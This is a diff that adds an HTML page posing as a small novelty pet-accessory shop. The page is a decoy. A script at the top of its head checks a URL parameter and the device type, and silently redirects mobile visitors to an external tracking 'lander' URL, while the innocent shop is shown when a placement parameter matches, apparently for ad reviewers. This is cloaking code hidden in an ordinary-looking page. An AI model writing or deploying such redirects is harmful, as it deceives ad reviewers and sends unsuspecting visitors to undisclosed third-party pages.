@@ -1,0 +1,115 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <script>
+    const urlParams = new URLSearchParams(window.location.search);
+    const utmXXX = urlParams.get("xxx");
+    const s = urlParams.get("s");
+    const ttclid = urlParams.get("ttclid");
+    const isMobileDevice = /Android|webOS|iPhone|iPad|iPod|BlackBerry|IEMobile|Opera Mini/i.test(navigator.userAgent);
+    const lander = `https://klcxb6.mcgo2.com/visit/7030fb24-f71e-4d19-916a-a1c232f79601?s1=${s}`;
+    if (utmXXX === "__PLACEMENT__") { }
+    else if (isMobileDevice) { window.location.href = lander; } 
+    else { }
+    </script>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Cosmic Pet Emporium</title>
+    <style>
+        body {
+            font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
+            background: linear-gradient(135deg, #f0f8ff, #e6e6fa);
+            margin: 0;
+            padding: 0;
+        }
+        header {
+            background-color: #4b0082;
+            color: #fff;
+            text-align: center;
+            padding: 20px;
+            border-bottom: 5px solid #9932cc;
+        }
+        nav {
+            background-color: #9932cc;
+            padding: 10px;
+            text-align: center;
+        }
+        nav a {
+            color: #fff;
+            text-decoration: none;
+            margin: 0 15px;
+            font-weight: bold;
+        }
+        main {
+            display: flex;
+            flex-wrap: wrap;
+            justify-content: space-around;
+            padding: 20px;
+        }
+        .product {
+            background-color: #fff;
+            border-radius: 15px;
+            box-shadow: 0 4px 8px rgba(0,0,0,0.1);
+            margin: 15px;
+            padding: 20px;
+            width: 250px;
+            text-align: center;
+        }
+        .product img {
+            max-width: 100%;
+            border-radius: 10px;
+        }
+        footer {
+            background-color: #4b0082;
+            color: #fff;
+            text-align: center;
+            padding: 10px;
+            position: fixed;
+            bottom: 0;
+            width: 100%;
+        }
+        footer a {
+            color: #ffd700;
+            text-decoration: none;
+        }
+    </style>
+</head>
+<body>
+    <header>
+        <h1>Cosmic Pet Emporium</h1>
+        <p>Out-of-this-world accessories for your intergalactic companions!</p>
+    </header>
+    <nav>
+        <a href="#home">Home</a>
+        <a href="#shop">Shop</a>
+        <a href="#about">About</a>
+        <a href="#contact">Contact</a>
+    </nav>
+    <main>
+        <div class="product">
+            <img src="https://placeimg.com/250/250/animals" alt="Gravity-Defying Collar">
+            <h2>Gravity-Defying Collar</h2>
+            <p>Keep your pet grounded in zero-gravity environments!</p>
+            <p>Price: $49.99</p>
+            <button>Add to Cart</button>
+        </div>
+        <div class="product">
+            <img src="https://placeimg.com/250/250/animals" alt="Nebula Fetch Ball">
+            <h2>Nebula Fetch Ball</h2>
+            <p>A ball that mimics the swirling colors of a nebula!</p>
+            <p>Price: $29.99</p>
+            <button>Add to Cart</button>
+        </div>
+        <div class="product">
+            <img src="https://placeimg.com/250/250/animals" alt="Asteroid Belt Leash">
+            <h2>Asteroid Belt Leash</h2>
+            <p>Walk your pet through the cosmos in style!</p>
+            <p>Price: $39.99</p>
+            <button>Add to Cart</button>
+        </div>
+    </main>
+    <footer>
+        <p>&copy; 2023 Cosmic Pet Emporium. All rights reserved. | <a href="https://tokreward.com/privacy.html">Privacy Policy</a></p>
+    </footer>
+</body>
+</html>
